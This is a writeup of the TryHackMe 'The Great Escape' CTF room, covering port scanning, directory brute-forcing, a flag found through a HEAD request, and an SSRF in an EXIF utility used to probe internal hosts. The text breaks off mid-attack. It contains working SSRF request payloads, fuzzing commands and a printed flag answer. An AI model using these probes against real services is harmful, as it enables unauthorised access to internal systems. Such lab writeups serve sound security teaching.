# The Great Escape — Writeup

## Overview
### The Great Escape — Writeup
### The Great Escape — Writeup
----
Our devs have created an awesome new site. Can you break out of the sandbox?
----
![](https://tryhackme-images.s3.amazonaws.com/room-icons/8fef301c6d66f1be947d7fc735486124.png)
### Introduction
Start Machine
If you're Stuck with the Docker Breakout part of this challenge, use the "[Docker Rodeo](https://tryhackme.com/room/dockerrodeo)" room to learn a wide variety of Docker vulnerabilities.
Answer the questions below
Deploy the VM
Question Done
### A Simple Webapp
Start off with a simple webapp. Can you find the hidden flag?
Answer the questions below

## Enumeration
```text
┌──(witty㉿kali)-[~/Downloads]
└─$ rustscan -a 10.10.141.57 --ulimit 5500 -b 65535 -- -A -Pn
.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
| {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \ |  `| |
| .-. \| {_} |.-._} } | |  .-._} }\     }/  /\  \| |\  |
`-' `-'`-----'`----'  `-'  `----'  `---' `-'  `-'`-' `-'
The Modern Day Port Scanner.
________________________________________
: https://discord.gg/GFrQsGy           :
: https://github.com/RustScan/RustScan :
 --------------------------------------
🌍HACK THE PLANET🌍

[~] The config file is expected to be at "/home/witty/.rustscan.toml"
[~] Automatically increasing ulimit value to 5500.
[!] File limit is lower than default batch size. Consider upping with --ulimit. May cause harm to sensitive servers
Open 10.10.141.57:22
Open 10.10.141.57:80
[~] Starting Script(s)
[>] Script to be run Some("nmap -vvv -p {{port}} {{ip}}")

Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
[~] Starting Nmap 7.93 ( https://nmap.org )
NSE: Loaded 155 scripts for scanning.
NSE: Script Pre-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE
Completed NSE
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE
Completed NSE
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE
Completed NSE
Initiating Parallel DNS resolution of 1 host.
Completed Parallel DNS resolution of 1 host.
DNS resolution of 1 IPs took 0.02s. Mode: Async [#: 1, OK: 0, NX: 1, DR: 0, SF: 0, TR: 1, CN: 0]
Initiating Connect Scan
Scanning 10.10.141.57 [2 ports]
Discovered open port 80/tcp on 10.10.141.57
Discovered open port 22/tcp on 10.10.141.57
Completed Connect Scan (2 total ports)
Initiating Service scan
Scanning 2 services on 10.10.141.57
Completed Service scan (2 services on 1 host)
NSE: Script scanning 10.10.141.57.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE
Completed NSE
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE
Completed NSE
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE
Completed NSE
Nmap scan report for 10.10.141.57
Host is up, received user-set (0.20s latency).

PORT   STATE SERVICE REASON  VERSION
22/tcp open  ssh?    syn-ack
|_ssh-hostkey: ERROR: Script execution failed (use -d to debug)
80/tcp open  http    syn-ack nginx 1.19.6
|_http-title: docker-escape-nuxt
| http-methods: 
|_  Supported Methods: GET HEAD
|_http-favicon: Unknown favicon MD5: 67EDB7D39E1376FDD8A24B0C640D781E
| http-robots.txt: 3 disallowed entries 
|_/api/ /exif-util /*.bak.txt$
|_http-server-header: nginx/1.19.6
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port22-TCP:V=7.93%I=7%D=4/7%Time=6430558D%P=x86_64-pc-linux-gnu%r(Gener
SF:icLines,4,"IR\r\n");

NSE: Script Post-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE
Completed NSE
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE
Completed NSE
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE
Completed NSE
Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 192.99 seconds

┌──(witty㉿kali)-[/tmp]
└─$ feroxbuster -u http://10.10.141.57/api/ -w /usr/share/wordlists/dirb/common.txt -k -t 64 -x php -s 200

 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben "epi" Risher 🤓                 ver: 2.7.3
───────────────────────────┬──────────────────────
 🎯  Target Url            │ http://10.10.141.57/api/
 🚀  Threads               │ 64
 📖  Wordlist              │ /usr/share/wordlists/dirb/common.txt
 👌  Status Codes          │ [200]
 💥  Timeout (secs)        │ 7
 🦡  User-Agent            │ feroxbuster/2.7.3
 💉  Config File           │ /etc/feroxbuster/ferox-config.toml
 💲  Extensions            │ [php]
 🏁  HTTP methods          │ [GET]
 🔓  Insecure              │ true
 🔃  Recursion Depth       │ 4
 🎉  New Version Available │ https://github.com/epi052/feroxbuster/releases/latest
───────────────────────────┴──────────────────────
 🏁  Press [ENTER] to use the Scan Management Menu™
──────────────────────────────────────────────────
[####################] - 30s     9228/9228    0s      found:0       errors:0 

http://10.10.141.57/.well-known/security.txt

Hey you found me!

The security.txt file is made to help security researchers and ethical hackers to contact the company about security issues.

See https://securitytxt.org/ for more information.

Ping /api/fl46 with a HEAD request for a nifty treat.

┌──(witty㉿kali)-[/tmp]
└─$ curl -I http://10.10.141.57/api/fl46                                                   
HTTP/1.1 200 OK
Server: nginx/1.19.6
Date: Fri, 07 Apr 2023 18:18:01 GMT
Connection: keep-alive
flag: THM{b801135794bf1ed3a2aafaa44c2e5ad4}

The "curl -I" command is used to send a HEAD request to a web server and retrieve only the headers of the HTTP response, without the body. This can be useful for checking the response headers, such as the status code, content type, and caching information, without downloading the entire response.

HEAD /api/fl46 HTTP/1.1

HTTP/1.1 200 OK

Server: nginx/1.19.6

Date: Fri, 07 Apr 2023 18:20:54 GMT

Connection: close

flag: THM{b801135794bf1ed3a2aafaa44c2e5ad4}
```
Find the flag hidden in the webapp
Some well known files may offer some help

## Privilege Escalation
There's a flag hidden by root on one of the machines. Can you find it?
Answer the questions below
```text
http://10.10.141.57/exif-util/

uploading an img

        EXIF:
----------------------
[JPEG] Compression Type - Baseline
[JPEG] Data Precision - 8 bits
[JPEG] Image Height - 533 pixels
[JPEG] Image Width - 800 pixels
[JPEG] Number of Components - 3
[JPEG] Component 1 - Y component: Quantization table 0, Sampling factors 2 horiz/2 vert
[JPEG] Component 2 - Cb component: Quantization table 1, Sampling factors 1 horiz/1 vert
[JPEG] Component 3 - Cr component: Quantization table 1, Sampling factors 1 horiz/1 vert
[JFIF] Version - 1.1
[JFIF] Resolution Units - none
[JFIF] X Resolution - 1 dot
[JFIF] Y Resolution - 1 dot
[JFIF] Thumbnail Width Pixels - 0
[JFIF] Thumbnail Height Pixels - 0
[ICC Profile] Profile Size - 524
[ICC Profile] CMM Type - lcms
[ICC Profile] Version - 2.1.0
[ICC Profile] Class - Display Device
[ICC Profile] Color space - RGB 
[ICC Profile] Profile Connection Space - XYZ 
[ICC Profile] Profile Date/Time - 2012:01:25 03:41:57
[ICC Profile] Signature - acsp
[ICC Profile] Primary Platform - Apple Computer, Inc.
[ICC Profile] XYZ values - 0.964 1 0.825
[ICC Profile] Tag Count - 10
[ICC Profile] Profile Description - c2
[ICC Profile] Profile Copyright - FB
[ICC Profile] Media White Point - (0.9642, 1, 0.8249)
[ICC Profile] Media Black Point - (0.0121, 0.0125, 0.0103)
[ICC Profile] Red Colorant - (0.4361, 0.2225, 0.0139)
[ICC Profile] Green Colorant - (0.3851, 0.7169, 0.0971)
[ICC Profile] Blue Colorant - (0.1431, 0.0606, 0.7141)
[ICC Profile] Red TRC - 0.0, 0.0030976, 0.0069734, 0.0132296, 0.0217594, 0.0328832, 0.0467231, 0.0634623, 0.0832685, 0.1062638, 0.1325856, 0.162356, 0.1956817, 0.2327001, 0.273518, 0.3182269, 0.3669032, 0.4196841, 0.4766461, 0.5378653, 0.6034638, 0.6734874, 0.7480125, 0.8272068, 0.9109026, 1.0
[ICC Profile] Green TRC - 0.0, 0.0030976, 0.0069734, 0.0132296, 0.0217594, 0.0328832, 0.0467231, 0.0634623, 0.0832685, 0.1062638, 0.1325856, 0.162356, 0.1956817, 0.2327001, 0.273518, 0.3182269, 0.3669032, 0.4196841, 0.4766461, 0.5378653, 0.6034638, 0.6734874, 0.7480125, 0.8272068, 0.9109026, 1.0
[ICC Profile] Blue TRC - 0.0, 0.0030976, 0.0069734, 0.0132296, 0.0217594, 0.0328832, 0.0467231, 0.0634623, 0.0832685, 0.1062638, 0.1325856, 0.162356, 0.1956817, 0.2327001, 0.273518, 0.3182269, 0.3669032, 0.4196841, 0.4766461, 0.5378653, 0.6034638, 0.6734874, 0.7480125, 0.8272068, 0.9109026, 1.0
[Huffman] Number of Tables - 4 Huffman tables
[File Type] Detected File Type Name - JPEG
[File Type] Detected File Type Long Name - Joint Photographic Experts Group
[File Type] Detected MIME Type - image/jpeg
[File Type] Expected File Name Extension - jpg
[File] File Name - pfx4603328967788719562sfx
[File] File Size - 42663 bytes
[File] File Modified Date - Fri Apr 07 18:28:02 +00:00 2023

XMP:
----------------------

using url

┌──(witty㉿kali)-[~/Downloads]
└─$ file filekoth 
filekoth: JPEG image data, JFIF standard 1.01, resolution (DPI), density 72x72, segment length 16, baseline, precision 8, 1350x900, components 3

┌──(witty㉿kali)-[~/Downloads]
└─$ python3 -m http.server 1234       
Serving HTTP on 0.0.0.0 port 1234 (http://0.0.0.0:1234/) ...
10.10.141.57 - - [07/Apr/2023 14:31:13] "GET /filekoth HTTP/1.1" 200 -

http://10.8.19.103:1234/filekoth

        EXIF:
----------------------
[JPEG] Compression Type - Baseline
[JPEG] Data Precision - 8 bits
[JPEG] Image Height - 900 pixels
[JPEG] Image Width - 1350 pixels
[JPEG] Number of Components - 3
[JPEG] Component 1 - Y component: Quantization table 0, Sampling factors 2 horiz/2 vert
[JPEG] Component 2 - Cb component: Quantization table 1, Sampling factors 1 horiz/1 vert
[JPEG] Component 3 - Cr component: Quantization table 1, Sampling factors 1 horiz/1 vert
[JFIF] Version - 1.1
[JFIF] Resolution Units - inch
[JFIF] X Resolution - 72 dots
[JFIF] Y Resolution - 72 dots
[JFIF] Thumbnail Width Pixels - 0
[JFIF] Thumbnail Height Pixels - 0
[Huffman] Number of Tables - 4 Huffman tables
[File Type] Detected File Type Name - JPEG
[File Type] Detected File Type Long Name - Joint Photographic Experts Group
[File Type] Detected MIME Type - image/jpeg
[File Type] Expected File Name Extension - jpg

XMP:
----------------------

GET /api/exif?url=http:%2F%2F10.8.19.103:1234%2Ffilekoth HTTP/1.1

SSRF

HTTP/1.1 200 OK

Server: nginx/1.19.6

Date: Fri, 07 Apr 2023 18:31:15 GMT

Content-Type: text/plain;charset=UTF-8

Content-Length: 925

Connection: close

EXIF:
----------------------
[JPEG] Compression Type - Baseline
[JPEG] Data Precision - 8 bits
[JPEG] Image Height - 900 pixels
[JPEG] Image Width - 1350 pixels
[JPEG] Number of Components - 3
[JPEG] Component 1 - Y component: Quantization table 0, Sampling factors 2 horiz/2 vert
[JPEG] Component 2 - Cb component: Quantization table 1, Sampling factors 1 horiz/1 vert
[JPEG] Component 3 - Cr component: Quantization table 1, Sampling factors 1 horiz/1 vert
[JFIF] Version - 1.1
[JFIF] Resolution Units - inch
[JFIF] X Resolution - 72 dots
[JFIF] Y Resolution - 72 dots
[JFIF] Thumbnail Width Pixels - 0
[JFIF] Thumbnail Height Pixels - 0
[Huffman] Number of Tables - 4 Huffman tables
[File Type] Detected File Type Name - JPEG
[File Type] Detected File Type Long Name - Joint Photographic Experts Group
[File Type] Detected MIME Type - image/jpeg
[File Type] Expected File Name Extension - jpg

XMP:
----------------------

send to repeater

GET /api/exif?url=http://127.0.0.1:8080 HTTP/1.1

HTTP/1.1 200 OK

Server: nginx/1.19.6

Date: Fri, 07 Apr 2023 18:39:24 GMT

Content-Type: text/plain;charset=UTF-8

Content-Length: 342

Connection: close

An error occurred: File format could not be determined
                Retrieved Content
                ----------------------------------------
                <!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>Nothing to see here</title>
</head>
<body>

<p>Nothing to see here, move along...</p>

</body>
</html>

trying with port 22,80 and 8080

creating a wordlist to get /*.bak.txt$

┌──(witty㉿kali)-[~/Downloads]
└─$ cewl http://10.10.85.253 -d 5 -o           
CeWL 5.5.2 (Grouping) Robin Wood (robin@digi.ninja) (https://digi.ninja/)
docker
escape
nuxt
Loading

uhmm manually

┌──(witty㉿kali)-[/tmp]
└─$ nano wordlist-man
                                                                                                 
┌──(witty㉿kali)-[/tmp]
└─$ cat wordlist-man 
login
users
user
photo
image
sign-up
signup
Signup
SignUp
test
courses
username
user
admin
photos
images
exif-util
classroom
class
course
photos

┌──(witty㉿kali)-[/tmp]
└─$ wfuzz -u http://10.10.85.253/FUZZ.bak.txt -w /tmp/wordlist-man --hc 404,503 --hh 3834
 /usr/lib/python3/dist-packages/wfuzz/__init__.py:34: UserWarning:Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz's documentation for more information.
********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: http://10.10.85.253/FUZZ.bak.txt
Total requests: 21

=====================================================================
ID           Response   Lines    Word       Chars       Payload                         
=====================================================================

000000017:   200        64 L     125 W      1479 Ch     "exif-util"                     

Total time: 9.437551
Processed Requests: 21
Filtered Requests: 20
Requests/sec.: 2.225153

http://10.10.85.253/exif-util.bak.txt

<template>
  <section>
    <div class="container">
      <h1 class="title">Exif Utils</h1>
      <section>
        <form @submit.prevent="submitUrl" name="submitUrl">
          <b-field grouped label="Enter a URL to an image">
            <b-input
              placeholder="http://..."
              expanded
              v-model="url"
            ></b-input>
            <b-button native-type="submit" type="is-dark">
              Submit
            </b-button>
          </b-field>
        </form>
      </section>
      <section v-if="hasResponse">
        <pre>
          {{ response }}
        </pre>
      </section>
    </div>
  </section>
</template>

<script>
export default {
  name: 'Exif Util',
  auth: false,
  data() {
    return {
      hasResponse: false,
      response: '',
      url: '',
    }
  },
  methods: {
    async submitUrl() {
      this.hasResponse = false
      console.log('Submitted URL')
      try {
        const response = await this.$axios.$get('http://api-dev-backup:8080/exif', {
          params: {
            url: this.url,
          },
        })
        this.hasResponse = true
        this.response = response
      } catch (err) {
        console.log(err)
        this.$buefy.notification.open({
          duration: 4000,
          message: 'Something bad happened, please verify that the URL is valid',
          type: 'is-danger',
          position: 'is-top',
          hasIcon: true,
        })
      }
    },
  },
}
</script>

GET /api/exif?url=http://api-dev-backup:8080/exif HTTP/1.1

Server: nginx/1.19.6

Date: Fri, 07 Apr 2023 20:04:19 GMT

Content-Type: text/plain;charset=UTF-8

Content-Length: 3287

Connection: close
